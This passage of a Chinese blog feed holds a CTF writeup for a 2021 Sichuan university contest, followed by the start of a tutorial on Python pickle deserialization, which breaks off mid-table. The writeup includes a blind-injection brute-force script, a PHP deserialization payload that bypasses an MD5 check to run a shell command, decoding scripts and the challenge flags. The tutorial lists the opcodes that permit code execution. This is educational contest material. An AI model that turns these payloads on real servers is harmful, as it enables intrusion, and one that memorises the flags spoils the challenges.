class="hljs-comment">#print(url+payload)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Enjoy This Game&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> re.text:<br>                result+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)<br>                <span class="hljs-built_in">print</span>(result)<br>                <span class="hljs-keyword">break</span><br>    result=result[:-<span class="hljs-number">1</span>]+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(result[-<span class="hljs-number">1</span>])+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br><br>url=<span class="hljs-string">&quot;http://127.0.0.1/?id=&quot;</span><br>exp(url)<br></code></pre></td></tr></table></figure><h3 id="flag值"><a href="#flag值" class="headerlink" title="flag值"></a>flag值</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">31</span>df<span class="hljs-number">1</span>d<span class="hljs-number">6</span>dca<span class="hljs-number">4683</span>ad<span class="hljs-number">8</span>c<span class="hljs-number">27</span>acf<span class="hljs-number">8</span>c<span class="hljs-number">7</span>c<span class="hljs-number">04326</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="题目二-papapa"><a href="#题目二-papapa" class="headerlink" title="题目二 papapa"></a>题目二 papapa</h3><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>扫描目录发现robots.txt</p><p>看<code>robots.txt</code>有提示<code>main.php</code><br><img src="/wzimg/210.png" alt="image-20210515135112692"><br><img src="/wzimg/211.png" alt="image-20210515140017409"></p><p>传参a发现了加密的代码</p><p><img src="/wzimg/212.png" alt="image-20210515140140792"></p><p>两次base64解码 再 16进制解码得到源码</p><p><img src="/wzimg/213.png" alt="image-20210515140619900"></p><p><code>md5</code>数组绕过，正则那可以<code>-</code>绕过，也可以用<code>%0a</code>绕过</p><p>然后知道了<code>system()</code>能命令执行</p><p>构造<code>payload</code></p><p>使用<code>ls </code>看到<code>wobushif0agaaa.txt</code></p><p><code>cat</code>这个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// &#x27;this_is_a_easy_php&#x27;</span><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NoVu</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$command</span>=<span class="hljs-string">&#x27;cat wobushif0agaaa.txt&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> NoVu));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最后的<code>payload</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/main.php?a[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;b[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>-&amp;d<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-string">&quot;NoVu&quot;</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-string">&quot;command&quot;</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">22</span><span class="hljs-variable">%3</span>A<span class="hljs-string">&quot;cat+wobushif0agaaa.txt&quot;</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p><img src="/wzimg/214.png" alt="image-20210515162112926"></p><h3 id="flag值-1"><a href="#flag值-1" class="headerlink" title="flag值"></a>flag值</h3><p>flag{73ac78436f0e761123a9888bf24a5c79}</p><h3 id="题目三-Misc-我的世界"><a href="#题目三-Misc-我的世界" class="headerlink" title="题目三 Misc 我的世界"></a>题目三 Misc 我的世界</h3><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><pre><code>下载文件后打开我的世界，发现真的是个游戏：</code></pre><p><img src="/wzimg/215.png" alt="img"><img src="/wzimg/216.png" alt="img"><img src="/wzimg/217.png" alt="img"><img src="/wzimg/218.png" alt="img"> </p><p>在信标处宝箱内可以得到一本名字为<code>flag1</code>的书，打开后发现以上字符串，初步断定是<code>栅栏加密</code>，先解一下，这里我用的<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">在线工具</a>，当栏数为14时得到</p><p><img src="/wzimg/219.png" alt="img"> </p><p>很像<code>flag</code>了，尝试提交但是不对，继续在地图内探索，在信标旁内的洞穴内发现有如下：</p><p><img src="/wzimg/220.png" alt="img"></p><p>可以看到在信标附近有异常，飞过去看，是这个：<br><img src="/wzimg/221.png" alt="img"></p><p>结合flag=1+1，经过尝试得到flag，居然是把<code>CTF515</code>加在后面，不得不说这个题确实有点脑洞的感觉。</p><p>flag值上传图片失败。错误信息： <code>Comman</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;scdxsCTF<span class="hljs-number">2021422</span>CTF<span class="hljs-number">515</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="题目四-Misc-disk-recover"><a href="#题目四-Misc-disk-recover" class="headerlink" title="题目四 Misc disk-recover"></a>题目四 Misc disk-recover</h3><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>下载解压题目得到<code>upload.pcapng</code>文件，直接用<code>7-Zip</code>可以解压出一个已损坏的光盘映像文件<code>disk-recovery.img</code>，直接用<code>DiskGenius</code>恢复。</p><p>先打开损坏文件：</p><p><img src="/wzimg/222.png" alt="img"></p><p>再选中恢复</p><p><img src="/wzimg/223.png" alt="img"> </p><pre><code>得到了一个.xls文件,</code></pre><p><img src="/wzimg/224.png" alt="img"> </p><p><img src="/wzimg/225.png" alt="img"> </p><p>打开就可以看到flag</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag:"></a>flag:</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;E<span class="hljs-number">7</span>A<span class="hljs-number">10</span>C<span class="hljs-number">15</span>E<span class="hljs-number">26</span>AA<span class="hljs-number">5750070</span>EF<span class="hljs-number">756</span>AAA<span class="hljs-number">1</span>F<span class="hljs-number">7</span>C&#125;<br></code></pre></td></tr></table></figure><h3 id="题目五-Misc-pack"><a href="#题目五-Misc-pack" class="headerlink" title="题目五 Misc pack"></a>题目五 Misc pack</h3><h3 id="操作内容"><a href="#操作内容" class="headerlink" title="操作内容:"></a>操作内容:</h3><p>ctf.exe，pe view打开，可以看到节区名错了</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/wzimg/226.png" alt="img"></h2><p><code>upx</code>脱壳，脱壳先修改节区名</p><p>脱壳完后，用<code>ResourceHacker.exe</code>打开，看资源，得到flag分为2部分</p><p><img src="/wzimg/227.png" alt="img"> </p><h3 id="flag："><a href="#flag：" class="headerlink" title="flag："></a>flag：</h3><h3 id="flag-0bed66d154ccbdd07a6342abf97a5cfc"><a href="#flag-0bed66d154ccbdd07a6342abf97a5cfc" class="headerlink" title="flag{0bed66d154ccbdd07a6342abf97a5cfc}"></a>flag{0bed66d154ccbdd07a6342abf97a5cfc}</h3><h3 id="题目六-em0ji"><a href="#题目六-em0ji" class="headerlink" title="题目六 em0ji"></a>题目六 em0ji</h3><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>下载附件打开<br><img src="/wzimg/228.png" alt="image-20210515141433133"></p><p>前面四个肯定是<code>flag</code></p><p>所以借此线索进行收集</p><p>网上搜索emoji的官方网站</p><p><a href="https://www.emojiall.com/zh-hans/emoji/%F0%9F%98%81">https://www.emojiall.com/zh-hans/emoji/%F0%9F%98%81</a></p><p><img src="/wzimg/229.png" alt="image-20210515203137931"></p><p>查看简短代码的首字母，拼接得到</p><p><img src="/wzimg/230.png" alt="image-20210515141708869"></p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">flag</span><span class="hljs-template-variable">&#123;emojiisverysimple&#125;</span><br></code></pre></td></tr></table></figure><h3 id="题目七-easy-re"><a href="#题目七-easy-re" class="headerlink" title="题目七 easy_re"></a>题目七 easy_re</h3><h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>upx解壳，手动或者upx脱。</p><p>分析流程<br><img src="/wzimg/231.png"><br>脚本</p><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> code[]=<span class="hljs-string">&quot;&#x27;- &amp;:8.4a 3$a&amp;3$ 5```&lt;&quot;</span>;<br><span class="hljs-keyword">int</span> i;<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">22</span>;i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,code[i]^<span class="hljs-number">0x41</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="flag值-2"><a href="#flag值-2" class="headerlink" title="flag值"></a>flag值</h3><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">flag&#123;you are great!!!&#125;<br></code></pre></td></tr></table></figure><h3 id="题目八-easy-pyc"><a href="#题目八-easy-pyc" class="headerlink" title="题目八 easy.pyc"></a>题目八 easy.pyc</h3><h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>pyc转py</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">uncompyle6 -o  C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>p<span class="hljs-symbol">\D</span>ownloads<span class="hljs-symbol">\e</span>asy.py C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>p<span class="hljs-symbol">\D</span>ownloads<span class="hljs-symbol">\e</span>asy.pyc<br></code></pre></td></tr></table></figure><p>然后看流程<br><img src="/wzimg/234.png"></p><h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>url = <span class="hljs-string">&quot;XlhlX0sMEWNiDxQQDgwTXl5eZRFgFWMOFBATXhMMYw8PD2UMZUk=&quot;</span><br>str_url = base64.b64decode(url)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str_url:<br>    x=(i-<span class="hljs-number">6</span>)^<span class="hljs-number">62</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(x),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="flag值-3"><a href="#flag值-3" class="headerlink" title="flag值"></a>flag值</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">85</span>cb<span class="hljs-number">704683</span>fffa<span class="hljs-number">5</span>d<span class="hljs-number">1</span>c<span class="hljs-number">6043</span>f<span class="hljs-number">38</span>c<span class="hljs-number">777</span>a<span class="hljs-number">8</span>a&#125;<br></code></pre></td></tr></table></figure><h3 id="题目九-base变形计-exe"><a href="#题目九-base变形计-exe" class="headerlink" title="题目九 base变形计.exe"></a>题目九 base变形计.exe</h3><h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>upx脱壳<br><img src="/wzimg/232.png"></p><p>先得到str2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> v9[]=&#123;<span class="hljs-number">0x00000050</span>,<span class="hljs-number">0x00000067</span>,<span class="hljs-number">0x00000072</span>,<span class="hljs-number">0x00000062</span>,<span class="hljs-number">0x00000050</span>,<span class="hljs-number">0x00000019</span>,<span class="hljs-number">0x00000079</span>,<span class="hljs-number">0x0000001e</span>,<span class="hljs-number">0x00000047</span>,<span class="hljs-number">0x0000005e</span>,<span class="hljs-number">0x0000004f</span>,<span class="hljs-number">0x00000072</span>,<span class="hljs-number">0x00000044</span>,<span class="hljs-number">0x0000005d</span>,<span class="hljs-number">0x0000005f</span>,<span class="hljs-number">0x0000001b</span>,<span class="hljs-number">0x00000044</span>,<span class="hljs-number">0x00000070</span>,<span class="hljs-number">0x00000062</span>,<span class="hljs-number">0x00000063</span>,<span class="hljs-number">0x00000047</span>,<span class="hljs-number">0x0000005d</span>,<span class="hljs-number">0x00000047</span>,<span class="hljs-number">0x00000072</span>,<span class="hljs-number">0x00000045</span>,<span class="hljs-number">0x0000005e</span>,<span class="hljs-number">0x00000050</span>,<span class="hljs-number">0x00000063</span>,<span class="hljs-number">0x00000047</span>,<span class="hljs-number">0x00000070</span>,<span class="hljs-number">0x0000005b</span>,<span class="hljs-number">0x00000018</span>,<span class="hljs-number">0x00000050</span>,<span class="hljs-number">0x00000060</span>,<span class="hljs-number">0x00000069</span>,<span class="hljs-number">0x0000001f</span>,<span class="hljs-number">0x00000053</span>,<span class="hljs-number">0x0000005d</span>,<span class="hljs-number">0x0000004c</span>,<span class="hljs-number">0x00000066</span>,<span class="hljs-number">0x00000045</span>,<span class="hljs-number">0x0000005e</span>,<span class="hljs-number">0x00000053</span>,<span class="hljs-number">0x00000072</span>,<span class="hljs-number">0x00000053</span>,<span class="hljs-number">0x00000070</span>,<span class="hljs-number">0x0000005b</span>,<span class="hljs-number">0x0000007d</span>,<span class="hljs-number">0x00000053</span>,<span class="hljs-number">0x00000019</span>,<span class="hljs-number">0x0000001a</span>,<span class="hljs-number">0x00000017</span>&#125;;<br><span class="hljs-keyword">char</span> str2[]=<span class="hljs-string">&quot;0000000000000000000000000000000000000000000000000000&quot;</span>;<br><span class="hljs-keyword">int</span> i;<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">51</span>;i++)<br>&#123;<br>str2[i]=<span class="hljs-number">42</span>^v9[i];<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,str2[i]);<br>&#125;<br>&#125;<br><span class="hljs-comment">//zMXHz3S4mteXnwu1nZHImwmXotzImZq2zJC5ywfLotyXyZqWy30=</span><br></code></pre></td></tr></table></figure><p>变表base解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>str1 = <span class="hljs-string">&#x27;zMXHz3S4mteXnwu1nZHImwmXotzImZq2zJC5ywfLotyXyZqWy30=&#x27;</span><br><br>string1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&#x27;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br><span class="hljs-built_in">print</span>(base64.b64decode(str1.translate(<span class="hljs-built_in">str</span>.maketrans(string1, string2))))<br></code></pre></td></tr></table></figure><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">81115</span>e<span class="hljs-number">578</span>b<span class="hljs-number">1</span>c<span class="hljs-number">196</span>b<span class="hljs-number">346</span>f<span class="hljs-number">79</span>aae<span class="hljs-number">961</span>c<span class="hljs-number">40</span>c&#125;<br></code></pre></td></tr></table></figure><h3 id="题目十-2021年四川省大学生网络安全技能大赛问卷调查"><a href="#题目十-2021年四川省大学生网络安全技能大赛问卷调查" class="headerlink" title="题目十 2021年四川省大学生网络安全技能大赛问卷调查"></a>题目十 2021年四川省大学生网络安全技能大赛问卷调查</h3><h3 id="操作内容：-8"><a href="#操作内容：-8" class="headerlink" title="操作内容："></a>操作内容：</h3><p>有手就行</p><h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本:"></a>脚本:</h3><p>无</p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag:"></a>flag:</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;ZWNkeHNjdGZpc<span class="hljs-number">2</span>cwMGQ&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python反序列化漏洞</title>
    <link href="/2021/04/27/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/04/27/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="python反序列化漏洞"><a href="#python反序列化漏洞" class="headerlink" title="python反序列化漏洞"></a>python反序列化漏洞</h1><p>Python通过<code>pickle</code>或者<code>cpickle</code>库进行序列化和反序列化（只是cpickle更加快速）作用和PHP的serialize与unserialize一样</p><p><code>pickle</code>实际上可以看作一种<code>独立的语言</code>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><h3 id="dumps-函数"><a href="#dumps-函数" class="headerlink" title="dumps()函数"></a>dumps()函数</h3><p>测试代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python 2.x</span><br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-built_in">dict</span> = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&#x27;w0s1np&#x27;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">19</span>&#125;<br>a = pickle.dumps(<span class="hljs-built_in">dict</span>)<br><span class="hljs-built_in">print</span>(a, <span class="hljs-built_in">type</span>(a))<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><span class="hljs-string">&quot;(dp0<span class="hljs-subst">\n</span>S&#x27;age&#x27;<span class="hljs-subst">\n</span>p1<span class="hljs-subst">\n</span>I19<span class="hljs-subst">\n</span>sS&#x27;name&#x27;<span class="hljs-subst">\n</span>p2<span class="hljs-subst">\n</span>S&#x27;w0s1np&#x27;<span class="hljs-subst">\n</span>p3<span class="hljs-subst">\n</span>s.&quot;</span>, &lt;type &#x27;str&#x27;&gt;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python 3.x</span><br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-built_in">dict</span> = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&#x27;w0s1np&#x27;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">19</span>&#125;<br>a = pickle.dumps(<span class="hljs-built_in">dict</span>)<br><span class="hljs-built_in">print</span>(a, <span class="hljs-built_in">type</span>(a))<br></code></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">b&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">80</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">95</span>\<span class="hljs-keyword">x</span><span class="hljs-number">1</span>d\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>&#125;\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>(\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>name\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">06</span>w<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">03</span>age\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>K\<span class="hljs-keyword">x</span><span class="hljs-number">13</span>u.&#x27; &lt;class &#x27;bytes&#x27;&gt;<br></code></pre></td></tr></table></figure><p>在默认情况下Python 2.x中pickled后的数据是 <strong>字符串</strong> 的形式，Python 3.x中pickled后的数据是 <strong>字节对象</strong> 的形式。</p><h3 id="dump-函数"><a href="#dump-函数" class="headerlink" title="dump()函数"></a>dump()函数</h3><p>将指定的Python对象通过pickle序列化后写入打开的文件对象中</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="loads-函数"><a href="#loads-函数" class="headerlink" title="loads()函数"></a>loads()函数</h3><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python 2.x</span><br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-built_in">dict</span> = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&#x27;w0s1np&#x27;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">19</span>&#125;<br>a = pickle.loads(pickle.dumps(<span class="hljs-built_in">dict</span>))<br><span class="hljs-built_in">print</span>(a, <span class="hljs-built_in">type</span>(a))<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;w0s1np&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">19</span>&#125; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>默认情况下Python 2.x中pickled后的数据是 <strong>字符串形式</strong>，需要将它转换为字节对象才能被Python 3.x中的pickle.loads()反序列化；</p><h2 id="pickle-是什么？"><a href="#pickle-是什么？" class="headerlink" title="pickle 是什么？"></a>pickle 是什么？</h2><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。</p><p>PVM 由三部分组成：</p><ul><li><p>指令处理器</p><p>从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。</p><p>最终留在栈顶的值将被作为反序列化对象返回。</p></li><li><p>stack</p><p>由 Python 的 list 实现，被用来临时存储数据、参数以及对象。</p></li><li><p>memo</p><p>由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。</p></li></ul><p>常用的<code>opcode</code>如下：</p><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th><th>memo上的变化</th></tr></thead><tbody><tr><td>b’c’</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>b’o’</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>b’i’</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>b’N’</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>b’S’</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>b’V’</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>b’I’</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>b’F’</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>b’R’</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td><td>无</td></tr><tr><td>b’.’</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td><td>无</td></tr><tr><td>b’(‘</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td><td>无</td></tr><tr><td>b’t’</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>b’)’</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td><td>无</td></tr><tr><td>b’l’</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>b’]’</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td><td>无</td></tr><tr><td>b’d’</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>b’}’</td><td>向栈中直接压入一个空字典</td><td>}</td><t